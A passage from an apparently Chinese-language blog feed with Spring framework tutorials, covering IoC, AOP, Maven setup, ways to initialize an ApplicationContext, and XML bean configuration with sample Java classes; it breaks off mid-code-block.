        <content type="html"><![CDATA[<h2 id="一、什么是Spring？"><a href="#一、什么是Spring？" class="headerlink" title="一、什么是Spring？"></a>一、什么是Spring？</h2><blockquote><p>Spring是2003年兴起的一个轻量级的Java开源的开发框架，核心思想由Rod Johnson在《<em>Expert</em> <em>one</em> on <em>one</em> J2EE design and development》提出</p><p>Spring是为了解决企业应用开发的复杂性而创建</p><p>Spring的核心思想是控制翻转（IoC）和面向切面（AOP）。简单来说，Spring是一个分层的JavaSE/EE full-stack(一站式)轻量级开源框架</p></blockquote><h2 id="二、如何学习Spring"><a href="#二、如何学习Spring" class="headerlink" title="二、如何学习Spring"></a>二、如何学习Spring</h2><blockquote><p>可以参考脑图内容进行细致的学习</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/21601015-d920f75b77a71843.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h2 id="三、Why-Spring？"><a href="#三、Why-Spring？" class="headerlink" title="三、Why Spring？"></a>三、Why Spring？</h2><ul><li>令人更加方便，愉快的coding</li><li>应用程序代码并不依赖于spring APIs</li><li>Spring不和现有的解决方案竞争，而是致力于将它们融合在一起</li></ul><h2 id="四、Spring的特点及优势"><a href="#四、Spring的特点及优势" class="headerlink" title="四、Spring的特点及优势"></a>四、Spring的特点及优势</h2><h3 id="1-控制反转（IoC）"><a href="#1-控制反转（IoC）" class="headerlink" title="1.控制反转（IoC）"></a>1.控制反转（IoC）</h3><blockquote><p>Inversion of Control，缩写为IoC，也叫依赖注入（Dependency Injection，简称DI）</p></blockquote><p><strong>为什么要使用IoC</strong></p><blockquote><p>Ioc控制反转是指将我们new对象的过程，交由Ioc容器去创建，而和目的就是<code>解耦</code>降低模块之间的耦合度</p><p>在这之前我们先来说一下</p><p><code>依赖倒置原则</code></p><ul><li>1、高层模块不应该依赖底层模块，二者都应该依赖抽象。</li><li>2、抽象不应该依赖细节，细节应该依赖抽象</li><li>3、依赖倒置原则的中心核心就是面向接口编程</li><li>4、使用接口和抽象类指定好规范，而不设计任何具体的实现，把细节交由它们的实现来完成</li></ul></blockquote><p><em>举个例子</em></p><p>在不使用Ioc的情况我们想要完成一个curd功能需要这样，一步步创建对象，在依次组装，然后调用</p><pre class=" language-java"><code class="language-java">UserDAO dao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserDAO</span><span class="token punctuation">(</span><span class="token string">"mysql"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UserService service <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserService</span><span class="token punctuation">(</span>dao<span class="token punctuation">)</span><span class="token punctuation">;</span>Controller controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Controller</span><span class="token punctuation">(</span>service<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>那么这么做的弊端也就是不好之处是什么呢？</p><ol><li>创建过程复杂繁琐，模块之间依赖性太强，造成模块之间强耦合</li><li>违背了<code>依赖倒置原则</code>；当具体的实现发生改变，那么在使用的每一处代码都需要进行更改</li></ol><p><em>接下来说说使用</em>Ioc的好处</p><ol><li>对象之间依赖接口，不依赖于具体的实现，降低了对象之间的耦合度</li><li>上层不需要知道下层是如何创建的；说的就是面向接口和抽象</li></ol><p><strong>IoC和DI两者之间的关系</strong></p><blockquote><p>Ioc是一种软件设计的思想，而DI就是它的具体实现</p></blockquote><h3 id="2-面向切面（AOP）"><a href="#2-面向切面（AOP）" class="headerlink" title="2.面向切面（AOP）"></a>2.面向切面（AOP）</h3><blockquote><p>通过分离应用的业务逻辑与系统级服务、进行内聚性开放</p><p>应用对象只实现它们应该做的，即业务逻辑，如日志或事物支持</p></blockquote><p>顺便将解释一下，内聚性就是指<code>高内聚</code>：A模块拥有它应该拥有的所有功能，不需要依赖其他的模块，拆到不能再拆（微服务的最小服务、最小原子操作）</p><p>关于AOP这里我画了一张简易图供参考<br><img src="https://upload-images.jianshu.io/upload_images/21601015-66e192360bd985c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h3 id="3-强大的框架支持及兼容"><a href="#3-强大的框架支持及兼容" class="headerlink" title="3.强大的框架支持及兼容"></a>3.强大的框架支持及兼容</h3><p>Spring不和现有解决方案竞争，而是致力于将它们融合在一起;</p><p>如Hibernate，status2;</p><h3 id="4-丰富的内部功能支持"><a href="#4-丰富的内部功能支持" class="headerlink" title="4.丰富的内部功能支持"></a>4.丰富的内部功能支持</h3><p>自带SpringMvc、JdbcTemplate、RedisTemplate</p><h3 id="5-容器化管理"><a href="#5-容器化管理" class="headerlink" title="5.容器化管理"></a>5.容器化管理</h3><ul><li>管理应用对象的配置和生命周期</li><li>容器化存储对象</li></ul><h3 id="6-声明式事物管理"><a href="#6-声明式事物管理" class="headerlink" title="6.声明式事物管理"></a>6.声明式事物管理</h3><p>基于AOP的声明式管理开发，只需要关注业务逻辑，无需关注事物本身的逻辑处理代码</p><h3 id="7-强大的单元测试"><a href="#7-强大的单元测试" class="headerlink" title="7.强大的单元测试"></a>7.强大的单元测试</h3><ul><li><p>Spring支持对Junit单元测试的支持</p></li><li><p>无需容器即可对功能进行测试</p></li><li><p>支持数据Mock等</p></li></ul><h3 id="8-完善的开源社区"><a href="#8-完善的开源社区" class="headerlink" title="8.完善的开源社区"></a>8.完善的开源社区</h3><p>Spring整个框架体系完事、架构精妙、代码精致优良、大师级作品、设计模式应用灵活、对JAVA的应用淋漓尽致、造诣高深、且Spring已是一个完整的<code>社区生态</code>（最后一句话才是重点，嘿嘿）</p><p>这里给大家截图了一下Spring官网的Projects，可以看下为什么说它是一个完整的生态圈</p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-e44195b066cf38b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h3 id="color-green-学习推荐：-https-ke-qq-com-course-434219"><a href="#color-green-学习推荐：-https-ke-qq-com-course-434219" class="headerlink" title="$\color{green}{学习推荐：}$https://ke.qq.com/course/434219"></a>$\color{green}{学习推荐：}$<a href="https://ke.qq.com/course/434219" target="_blank" rel="noopener">https://ke.qq.com/course/434219</a></h3><h3 id="或者加群进行讨论：857565362，并获取学习资源"><a href="#或者加群进行讨论：857565362，并获取学习资源" class="headerlink" title="或者加群进行讨论：857565362，并获取学习资源"></a>或者加群进行讨论：857565362，并获取学习资源</h3>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
          <category> Spring源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Spring源码 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring由Bean出发的使用及相关核心功能</title>
      <link href="/2020/05/24/spring-you-bean-chu-fa-de-shi-yong-ji-xiang-guan-he-xin-gong-neng/"/>
      <url>/2020/05/24/spring-you-bean-chu-fa-de-shi-yong-ji-xiang-guan-he-xin-gong-neng/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Spring工程的创建"><a href="#一、Spring工程的创建" class="headerlink" title="一、Spring工程的创建"></a>一、Spring工程的创建</h2><h3 id="1、环境预设"><a href="#1、环境预设" class="headerlink" title="1、环境预设"></a>1、环境预设</h3><ul><li>Maven</li><li>JDK1.8</li><li>Spring5.1.7</li><li>Idea</li></ul><h3 id="2、项目创建"><a href="#2、项目创建" class="headerlink" title="2、项目创建"></a>2、项目创建</h3><p>1.使用Idea构建一个普通Maven项目</p><p>2.引入Spring5.1.7，详细看下面pom.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.wh.spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-vip-ioc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.1.7.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span></code></pre><h3 id="3、创建Spring配置文件"><a href="#3、创建Spring配置文件" class="headerlink" title="3、创建Spring配置文件"></a>3、创建Spring配置文件</h3><p>在项目resources里创建applicationContext.xml，内容如下</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><h2 id="二、Spring初始化的几种方式"><a href="#二、Spring初始化的几种方式" class="headerlink" title="二、Spring初始化的几种方式"></a>二、Spring初始化的几种方式</h2><h3 id="1-默认为项目工作路径，及项目的根目录"><a href="#1-默认为项目工作路径，及项目的根目录" class="headerlink" title="1.默认为项目工作路径，及项目的根目录"></a>1.默认为项目工作路径，及项目的根目录</h3><pre class=" language-java"><code class="language-java">ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-使用前缀file，表示文件的绝对路径"><a href="#2-使用前缀file，表示文件的绝对路径" class="headerlink" title="2.使用前缀file，表示文件的绝对路径"></a>2.使用前缀file，表示文件的绝对路径</h3><pre class=" language-java"><code class="language-java">ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"file:D:/applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-加载多个配置文件"><a href="#3-加载多个配置文件" class="headerlink" title="3.加载多个配置文件"></a>3.加载多个配置文件</h3><pre><code>String[] xmlCfg = new String[] {&quot;applicationContext.xml&quot;, &quot;file:D:/applicationContext.xml&quot;};ApplicationContext context = new ClassPathXmlApplicationContext(xmlCfg);</code></pre><h3 id="4-通配符加载"><a href="#4-通配符加载" class="headerlink" title="4.通配符加载"></a>4.通配符加载</h3><pre class=" language-java"><code class="language-java">ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"spring-*.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="5-没有前缀：默认为项目的classpath下相对路径"><a href="#5-没有前缀：默认为项目的classpath下相对路径" class="headerlink" title="5.没有前缀：默认为项目的classpath下相对路径"></a>5.没有前缀：默认为项目的classpath下相对路径</h3><pre class=" language-java"><code class="language-java">ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileSystemXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"/src/main/resources/spring-1.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="6-使用前缀file，表示文件的绝对路径"><a href="#6-使用前缀file，表示文件的绝对路径" class="headerlink" title="6.使用前缀file，表示文件的绝对路径"></a>6.使用前缀file，表示文件的绝对路径</h3><pre class=" language-java"><code class="language-java">ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileSystemXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"file:D:/spring-1.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="7-加载多个配置文件"><a href="#7-加载多个配置文件" class="headerlink" title="7.加载多个配置文件"></a>7.加载多个配置文件</h3><pre class=" language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> xmlCfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"file:D:/spring-1.xml"</span><span class="token punctuation">,</span> <span class="token string">"classpath:spring-2.xml"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileSystemXmlApplicationContext</span><span class="token punctuation">(</span>xmlCfg<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="8-通配符加载"><a href="#8-通配符加载" class="headerlink" title="8.通配符加载"></a>8.通配符加载</h3><pre><code>ApplicationContext context = new FileSystemXmlApplicationContext(&quot;classpath:spring-*.xml&quot;);</code></pre><h3 id="9-注解初始化（完成无xml化）"><a href="#9-注解初始化（完成无xml化）" class="headerlink" title="9.注解初始化（完成无xml化）"></a>9.注解初始化（完成无xml化）</h3><p>创建带有@Configuration的spring配置类，来代替applicationContext.xml</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>config<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Bean<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringApplicationConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span><span class="token string">"user2"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> User <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"小明"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>加载测试</p><pre><code>package org.wh.spring;import org.springframework.context.annotation.AnnotationConfigApplicationContext;import org.wh.spring.config.SpringApplicationConfig;import org.wh.spring.model.User;/** * 主入口 */public class ApplicationContextMain {    public static void main(String[] args) {        AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(SpringApplicationConfig.class);        User user = (User) context.getBean(&quot;user2&quot;);        System.out.println(user);        System.out.println(context);    }}</code></pre><h3 id="10-使用-ImportResource读取配置文件"><a href="#10-使用-ImportResource读取配置文件" class="headerlink" title="10.使用@ImportResource读取配置文件"></a>10.使用@ImportResource读取配置文件</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>config<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ImportResource<span class="token punctuation">;</span><span class="token annotation punctuation">@ImportResource</span><span class="token punctuation">(</span><span class="token string">"spring-1.xml"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringApplicationConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>spring-1.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.wh.spring.model.Order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderNumber<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10011001100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>price<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>21.00<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>测试</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>AnnotationConfigApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>config<span class="token punctuation">.</span>SpringApplicationConfig<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>Order<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 主入口 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationContextMain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        AnnotationConfigApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span>SpringApplicationConfig<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Order order <span class="token operator">=</span> <span class="token punctuation">(</span>Order<span class="token punctuation">)</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"order"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>类图预览</strong><br><img src="https://upload-images.jianshu.io/upload_images/21601015-f6dbcb3161bb68ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h3 id="Spring提供的两种容器类型，ApplicationContext和BeanFactory区别"><a href="#Spring提供的两种容器类型，ApplicationContext和BeanFactory区别" class="headerlink" title="Spring提供的两种容器类型，ApplicationContext和BeanFactory区别"></a>Spring提供的两种容器类型，ApplicationContext和BeanFactory区别</h3><blockquote><p>两者都是用来从容器中获取spring beans的，不同之处在于BeanFactory使用的是懒加载，也就是在我们通过getBean()调用它们时才会进行实例化，而ApplicationContext继承自BeanFactory，与前者不同的在于ApplicationContext在启动时就将所有beans全部实例化了</p><p>如何选择使用</p><p>因为BeanFactory是懒加载的，在调用时才能实例化，所以对内存消耗比较小，适合对资源有限情况</p><p>而ApplicationContext，在ApplicationContext启动时将所有的Bean都加载了，不需要每次调用在实例化使得应用运行速度较之更快</p><p>当然，在实际开发应用中ApplicationContext更为常用</p></blockquote><h2 id="三、基于XML的bean初始化及应用"><a href="#三、基于XML的bean初始化及应用" class="headerlink" title="三、基于XML的bean初始化及应用"></a>三、基于XML的bean初始化及应用</h2><h3 id="1-Bean属性标签"><a href="#1-Bean属性标签" class="headerlink" title="1.Bean属性标签"></a>1.Bean属性标签</h3><ul><li><p>id</p><p>bean的id，需满足XML命名规范</p></li><li><p>name</p><p>bean的name，与id一样，它们都是唯一性的，在配置文件中不允许出现两个</p></li><li><p>class</p><p>指向要初始化的类</p></li><li><p>property</p><p>属性赋值</p></li><li><p>ref</p><p>引用对象</p></li><li><p>constructor-arg</p><p>构造函数，例：<constructor-arg index="1" type="float" value="20.00" /></p><ul><li><p>index 构造函数中第几个参数</p></li><li><p>type 数据类型，基础数据类型直接写，否则写全路径java.lang.String</p></li><li><p>value 赋值</p></li></ul></li></ul><h3 id="2-Bean功能标签"><a href="#2-Bean功能标签" class="headerlink" title="2.Bean功能标签"></a>2.Bean功能标签</h3><ul><li><p>init-method</p><p>初始化时调用的方法</p></li><li><p>destroy-method</p><p>销毁时调用的方法</p></li><li><p>Scope</p><p>对象在spring容器（IoC容器）中的生命周期，也可以理解为对象在spring容器中的创建方式</p><ul><li>singleton 单例模式</li><li>prototype 原型模式</li></ul></li></ul><h3 id="3-示例演示"><a href="#3-示例演示" class="headerlink" title="3.示例演示"></a>3.示例演示</h3><p><strong>User</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> Order order<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Order <span class="token function">getOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> order<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrder</span><span class="token punctuation">(</span>Order order<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>order <span class="token operator">=</span> order<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"User{"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">", order="</span> <span class="token operator">+</span> order <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------User类初始化方法--------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroyMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------User类销毁方法--------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Order</strong></p><pre class=" language-java"><code 